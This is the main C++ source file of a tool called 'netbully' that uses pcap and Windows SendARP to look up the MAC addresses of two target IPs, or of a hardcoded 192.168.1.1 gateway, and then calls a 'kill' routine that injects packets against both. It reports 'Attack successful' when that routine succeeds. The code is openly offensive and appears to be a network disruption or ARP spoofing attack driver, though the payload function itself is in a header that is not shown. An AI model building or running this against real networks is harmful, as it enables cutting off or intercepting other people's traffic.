#include "netbully.h"

int main(int argc, char* argv[]) {
	if (argc != 3){
		cout << "Usage:" << endl << "netbully [target A] [target B]" << endl;
		return 1;
	}

	cout << "Which interface number would you like to use?" << endl;
	int ii = 1;
	vector<string> ifaces = getDevices();
	for (string dev : ifaces) {
		cout << "Number " << to_string(ii) << ": " << dev << endl;
		ii++;
	}
	string ifacen;
	cin >> ifacen;

	char errbuf[500];
	pcap_t* handle = pcap_open_live(ifaces[stoi(ifacen) - 1].c_str(), 65536, 0, 1, errbuf);
	if (handle == NULL) {
		cout << endl << "Failed to open driver handle." << endl;
		return 1;
	}

	ULONG maclen = 6;
	ULONG tam[6];
	ULONG tbm[6];
	uint8_t tai[4];
	uint8_t tbi[4];
	strToIp(argv[1], tai);
	strToIp(argv[2], tbi);

	if (string(argv[1]).substr(0, 7) == "192.168") {
		if (SendARP(inet_addr(argv[1]), INADDR_ANY, &tam, &maclen) != NO_ERROR) {
			cout << endl << "Failed to find MAC address for target A." << endl;
			return 0;
		}
	}
	else {
		if (SendARP(inet_addr("192.168.1.1"), INADDR_ANY, &tam, &maclen) != NO_ERROR) {
			cout << endl << "Failed to find MAC address for gateway." << endl;
			return 0;
		}
	}
	if (string(argv[2]).substr(0, 7) == "192.168") {
		if (SendARP(inet_addr(argv[2]), INADDR_ANY, &tbm, &maclen) != NO_ERROR) {
			cout << endl << "Failed to find MAC address for target B." << endl;
			return 0;
		}
	}
	else {
		if (SendARP(inet_addr("192.168.1.1"), INADDR_ANY, &tbm, &maclen) != NO_ERROR) {
			cout << endl << "Failed to find MAC address for gateway." << endl;
			return 0;
		}
	}

	if (kill(handle, (uint8_t*)(BYTE*)tam, tai, (uint8_t*)(BYTE*)tbm, tbi)) {
		cout << endl << "Attack successful." << endl;
	}
	else {
		cout << endl << "Failed to send payloads. Are you sure you've chosen the corrent interface?" << endl;
	}

	return 1;
}